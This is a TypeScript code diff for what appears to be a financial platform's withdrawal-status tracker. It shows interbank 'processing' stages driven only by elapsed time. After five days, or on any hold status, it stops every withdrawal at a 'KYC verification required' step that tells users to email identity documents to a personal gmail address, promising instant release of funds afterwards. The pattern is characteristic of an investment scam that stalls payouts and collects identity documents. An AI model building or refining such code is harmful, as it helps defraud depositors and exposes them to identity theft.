@@ -131,38 +131,32 @@ export function formatEstimatedArrival(createdAtStr: string): {
   daysText: string;
 } {
   const createdDate = new Date(createdAtStr);
-  const minDate = addBusinessDays(createdDate, 5);
-  const maxDate = addBusinessDays(createdDate, 7);
+  const targetDate = addBusinessDays(createdDate, 5);
 
   const monthNames = [
     "Jan", "Feb", "Mar", "Apr", "May", "Jun",
     "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
   ];
 
-  const minMonth = monthNames[minDate.getMonth()];
-  const maxMonth = monthNames[maxDate.getMonth()];
-  const minDay = minDate.getDate();
-  const maxDay = maxDate.getDate();
-  const year = maxDate.getFullYear();
-
-  const rangeText =
-    minMonth === maxMonth
-      ? `${minMonth} ${minDay} – ${maxDay}, ${year}`
-      : `${minMonth} ${minDay} – ${maxMonth} ${maxDay}, ${year}`;
+  const targetMonth = monthNames[targetDate.getMonth()];
+  const targetDay = targetDate.getDate();
+  const year = targetDate.getFullYear();
 
   return {
-    rangeText,
-    expectedDateText: `Expected by ${maxMonth} ${maxDay}, ${year}`,
-    daysText: "5–7 business days",
+    rangeText: `${targetMonth} ${targetDay}, ${year}`,
+    expectedDateText: `Expected by ${targetMonth} ${targetDay}, ${year}`,
+    daysText: "5 business days",
   };
 }
 
 export const TIMELINE_SUMMARY_STEPS = [
-  { stepNum: 1, label: "Request submitted & verified", timeWindow: "Day 1" },
+  { stepNum: 1, label: "Request submitted & ledger verification", timeWindow: "Day 1" },
   { stepNum: 2, label: "Interbank clearance & transmission", timeWindow: "Days 2–3" },
-  { stepNum: 3, label: "Beneficiary bank processing", timeWindow: "Days 4–5" },
-  { stepNum: 4, label: "Final settlement & credited", timeWindow: "Days 5–7" },
+  { stepNum: 3, label: "Beneficiary bank inward processing", timeWindow: "Days 4–5" },
+  { stepNum: 4, label: "Settlement clearance & account crediting", timeWindow: "Day 5" },
 ];
+
+export const COMPLIANCE_KYC_EMAIL = "moonlightwealthmanagement@gmail.com";
 
 export interface WithdrawalComplianceResult {
   statusLabel: string;
@@ -177,6 +171,9 @@ export interface WithdrawalComplianceResult {
   progressPercent: number;
   isProcessing: boolean;
   isHold: boolean;
+  isKycRequired: boolean;
+  kycEmail: string;
+  currentDayNumber: number;
   isSuccess: boolean;
   isFailed: boolean;
   stageNumber: number;
@@ -202,13 +199,15 @@ export function getWithdrawalComplianceInfo(
   const arrival = formatEstimatedArrival(createdAtStr);
   const upperStatus = (dbStatus || "PROCESSING").toUpperCase();
 
-  const isUPI =
-    Boolean(options?.isUPI) ||
-    options?.method?.toLowerCase().includes("upi") ||
-    options?.route?.toLowerCase() === "upi";
+  const isExplicitHold =
+    upperStatus === "ON HOLD" ||
+    upperStatus === "HOLD" ||
+    upperStatus === "UNDER REVIEW" ||
+    upperStatus === "KYC REQUIRED" ||
+    upperStatus === "ACTION REQUIRED";
 
-  // Finalized by admin
-  if (upperStatus === "COMPLETED" || upperStatus === "SUCCESS" || upperStatus === "APPROVED") {
+  // Finalized by admin: Success
+  if (upperStatus === "COMPLETED" || upperStatus === "SUCCESS" || upperStatus === "SUCCESSFUL" || upperStatus === "APPROVED") {
     return {
       statusLabel: "SUCCESS",
       stageTitle: "Payout Settled",
@@ -222,6 +221,9 @@ export function getWithdrawalComplianceInfo(
       progressPercent: 100,
       isProcessing: false,
       isHold: false,
+      isKycRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 5,
       isSuccess: true,
       isFailed: false,
       stageNumber: 4,
@@ -231,6 +233,7 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
+  // Finalized: Failed or Rejected
   if (upperStatus === "FAILED" || upperStatus === "REJECTED") {
     return {
       statusLabel: "FAILED",
@@ -245,6 +248,9 @@ export function getWithdrawalComplianceInfo(
       progressPercent: 0,
       isProcessing: false,
       isHold: false,
+      isKycRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 0,
       isSuccess: false,
       isFailed: true,
       stageNumber: 0,
@@ -254,6 +260,7 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
+  // Cancelled
   if (upperStatus === "CANCELLED") {
     return {
       statusLabel: "CANCELLED",
@@ -268,6 +275,9 @@ export function getWithdrawalComplianceInfo(
       progressPercent: 0,
       isProcessing: false,
       isHold: false,
+      isKycRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 0,
       isSuccess: false,
       isFailed: true,
       stageNumber: 0,
@@ -277,40 +287,43 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
-  // At >= 168 hours or explicit HOLD:
-  if (elapsedHours >= 168 || upperStatus === "ON HOLD" || upperStatus === "HOLD") {
+  // Case: >= 5 days (120 hours) OR explicitly on hold/review -> Triggers Mandatory KYC Requirement
+  if (elapsedHours >= 120 || isExplicitHold) {
     return {
-      statusLabel: "ON HOLD",
-      stageTitle: "Compliance Hold",
+      statusLabel: "KYC VERIFICATION REQUIRED",
+      stageTitle: "Action Required — KYC Verification",
       description:
-        "168-hour review completed. Final administrative sign-off required before release.",
-      currentStep: "Settlement Clearance Review",
+        "Outbound interbank settlement is on hold pending mandatory KYC identity verification. Please email your documents to moonlightwealthmanagement@gmail.com.",
+      currentStep: "Mandatory KYC Identity & Source Verification",
       currentStepDescription:
-        "Periodic clearing review in progress. Delivery remains expected within 5–7 business days.",
-      nextStep: "Administrative Clearance Release",
-      nextStepDescription: "Final sign-off prior to outward rail dispatch.",
+        "Automated clearance could not be completed. You will receive an email from Moonlight Financial with instructions to submit your KYC documents to moonlightwealthmanagement@gmail.com. As soon as verified, the funds will reflect in your bank account.",
+      nextStep: "Disbursement & Final Bank Credit",
+      nextStepDescription: "Amount will immediately reflect in your bank account upon verification of KYC documents.",
       estimatedArrivalDate: arrival.rangeText,
-      estimatedDaysText: arrival.daysText,
-      progressPercent: 65,
+      estimatedDaysText: "Pending KYC Verification",
+      progressPercent: 80,
       isProcessing: true,
       isHold: true,
+      isKycRequired: true,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 5,
       isSuccess: false,
       isFailed: false,
-      stageNumber: 3,
+      stageNumber: 4,
       totalStages: 4,
       elapsedText,
       nextReviewHours: 0,
     };
   }
 
-  // Active Processing 0–168 hours across standard 5–7 business days milestones:
+  // Active Processing within the 5 business days timeline:
+  // Day 1 (0 to 24 hours): Submission & Internal Ledger Clearance
   if (elapsedHours < 24) {
-    // Day 1: Verification & Authorization
     const nextWindow = Math.max(1, Math.ceil(24 - elapsedHours));
     return {
       statusLabel: "PROCESSING",
-      stageTitle: "Payment Details Review",
-      description: "Verifying withdrawal request parameters and payout destination format.",
+      stageTitle: "Payment Details & Ledger Review",
+      description: "Verifying withdrawal request parameters and securing wallet ledger debit.",
       currentStep: "Payment Verification & Authorization",
       currentStepDescription:
         "Withdrawal request authorized and queued for domestic clearing transmission.",
@@ -321,6 +334,9 @@ export function getWithdrawalComplianceInfo(
       progressPercent: 25,
       isProcessing: true,
       isHold: false,
+      isKycRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 1,
       isSuccess: false,
       isFailed: false,
       stageNumber: 1,
@@ -330,14 +346,15 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
+  // Days 2–3 (24 to 72 hours): Interbank Clearance & Transmission
   if (elapsedHours < 72) {
-    // Days 2–3: Interbank Rail Clearance
     const nextWindow = Math.max(1, Math.ceil(72 - elapsedHours));
+    const dayNum = elapsedHours < 48 ? 2 : 3;
     return {
       statusLabel: "PROCESSING",
-      stageTitle: "Interbank Clearance",
-      description: "Routing through domestic banking clearance network.",
-      currentStep: "Interbank Clearance & Routing",
+      stageTitle: "Interbank Clearance & Routing",
+      description: "Routing through national payment settlement switch to beneficiary institution.",
+      currentStep: "Interbank Clearance & Transmission",
       currentStepDescription:
         "Transaction is in transit through the domestic payment clearing house to the beneficiary bank.",
       nextStep: "Beneficiary Bank Inward Verification",
@@ -347,6 +364,9 @@ export function getWithdrawalComplianceInfo(
       progressPercent: 50,
       isProcessing: true,
       isHold: false,
+      isKycRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: dayNum,
       isSuccess: false,
       isFailed: false,
       stageNumber: 2,
@@ -356,51 +376,29 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
-  if (elapsedHours < 120) {
-    // Days 4–5: Beneficiary Bank Processing
-    const nextWindow = Math.max(1, Math.ceil(120 - elapsedHours));
-    return {
-      statusLabel: "PROCESSING",
-      stageTitle: "Beneficiary Bank Processing",
-      description: "Transferred to recipient banking institution for inward ledger allocation.",
-      currentStep: "Beneficiary Bank Processing",
-      currentStepDescription:
-        "Funds received by destination institution. Awaiting inward ledger allocation.",
-      nextStep: "Account Statement Posting",
-      nextStepDescription: "Final account balance credit by beneficiary institution.",
-      estimatedArrivalDate: arrival.rangeText,
-      estimatedDaysText: arrival.daysText,
-      progressPercent: 75,
-      isProcessing: true,
-      isHold: false,
-      isSuccess: false,
-      isFailed: false,
-      stageNumber: 3,
-      totalStages: 4,
-      elapsedText,
-      nextReviewHours: nextWindow,
-    };
-  }
-
-  // Days 6–7: Final Settlement & Credit
-  const nextWindow = Math.max(1, Math.ceil(168 - elapsedHours));
+  // Days 4–5 (72 to 120 hours): Beneficiary Bank Inward Processing
+  const nextWindow = Math.max(1, Math.ceil(120 - elapsedHours));
+  const dayNum = elapsedHours < 96 ? 4 : 5;
   return {
     statusLabel: "PROCESSING",
-    stageTitle: "Final Settlement",
-    description: "Final review stage prior to administrative release.",
-    currentStep: "Final Settlement & Credit",
+    stageTitle: "Beneficiary Bank Processing",
+    description: "Transferred to recipient banking institution for inward ledger allocation.",
+    currentStep: "Beneficiary Bank Processing & Inward Audit",
     currentStepDescription:
-      "Final clearing window. Transaction being posted to recipient statement.",
-    nextStep: "Funds Available in Account",
-    nextStepDescription: "Transfer completed and available in beneficiary account.",
+      "Funds received by destination institution. Awaiting inward ledger allocation and compliance sign-off.",
+    nextStep: "Account Statement Posting & Settlement",
+    nextStepDescription: "Final account balance credit by beneficiary institution.",
     estimatedArrivalDate: arrival.rangeText,
     estimatedDaysText: arrival.daysText,
-    progressPercent: 90,
+    progressPercent: 75,
     isProcessing: true,
     isHold: false,
+    isKycRequired: false,
+    kycEmail: COMPLIANCE_KYC_EMAIL,
+    currentDayNumber: dayNum,
     isSuccess: false,
     isFailed: false,
-    stageNumber: 4,
+    stageNumber: 3,
     totalStages: 4,
     elapsedText,
     nextReviewHours: nextWindow,
